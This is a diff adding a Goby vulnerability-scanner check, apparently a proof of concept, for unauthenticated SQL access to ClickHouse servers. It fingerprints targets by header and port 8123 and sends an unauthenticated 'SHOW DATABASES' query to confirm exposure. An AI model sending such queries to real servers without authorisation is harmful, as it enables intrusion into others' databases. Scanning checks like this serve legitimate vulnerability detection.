@@ -1,0 +1,103 @@
+{
+      "Name": "ClickHouse SQLI",
+      "Level": "3",
+      "Tags": [
+            "sqli"
+      ],
+      "GobyQuery": "(banner=\"X-Clickhouse-Summary\" | port=\"8123\")",
+      "Description": "ClickHouse 存在着的接口由于没有鉴权，则任意访问者都可以执行SQL语句获取数据.",
+      "Product": "ClickHouse",
+      "Homepage": "https://gobies.org/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://mp.weixin.qq.com/s/xIc3Ic7N104iTogZul1LJA"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ping",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "X-Clickhouse-Summary",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/?query=SHOW%20DATABASES",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "default",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "system",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-12-04 18:32:14",
+      "GobyVersion": "1.9.310"
+}
